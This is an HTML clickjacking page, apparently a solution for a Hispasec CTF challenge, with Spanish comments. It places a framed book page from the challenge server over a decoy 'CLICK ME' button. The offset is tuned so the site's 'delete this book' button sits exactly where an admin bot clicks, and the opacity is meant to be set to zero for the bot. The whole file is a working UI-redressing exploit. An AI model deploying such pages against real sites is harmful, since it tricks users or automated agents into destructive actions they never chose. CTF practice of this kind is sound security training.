<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <style>
        /* El botón que el bot busca por ID */
        #objetivo {
            position: absolute;
            top: 300px; /* Posición estándar de clic de bot */
            left: 50%;
            transform: translateX(-50%);
            width: 300px;
            height: 100px;
            z-index: 1;
            opacity: 0.1; /* Un poco visible para que veas dónde está */
        }

        /* El iframe con la página del libro */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 1000px;
            border: none;
            z-index: 2;
            /* CALIBRACIÓN CRÍTICA */
            /* Este valor debe subir la página hasta que el botón gris 
               de "Borrar este libro" tape a tu botón rojo */
            margin-top: -730px; 
            opacity: 0.5; /* CAMBIA A 0 PARA EL BOT */
        }
    </style>
</head>
<body>

    <button id="objetivo">CLICK ME</button>

    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>

</body>
</html>
